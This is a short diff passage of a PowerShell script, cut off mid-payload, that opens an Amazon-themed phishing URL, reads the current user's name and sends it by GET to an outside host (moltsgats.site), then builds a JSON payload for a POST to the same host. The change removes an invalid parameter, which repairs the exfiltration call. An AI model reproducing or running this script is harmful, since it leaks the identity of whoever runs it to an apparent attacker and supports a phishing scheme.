@@ -3,7 +3,7 @@ Start-Process "https://amazon.validation-service.salleurl.nl/etic"
 $username = $env:USERNAME
 #
 $getUrl = "https://moltsgats.site/sendsal2025?$username"
-Invoke-RestMethod -Uri $getUrl -Method Get -UseBasicPipelining
+Invoke-RestMethod -Uri $getUrl -Method Get
 #
 $postUrl = "https://moltsgats.site/sendsal2025"
 $jsonPayload = @{
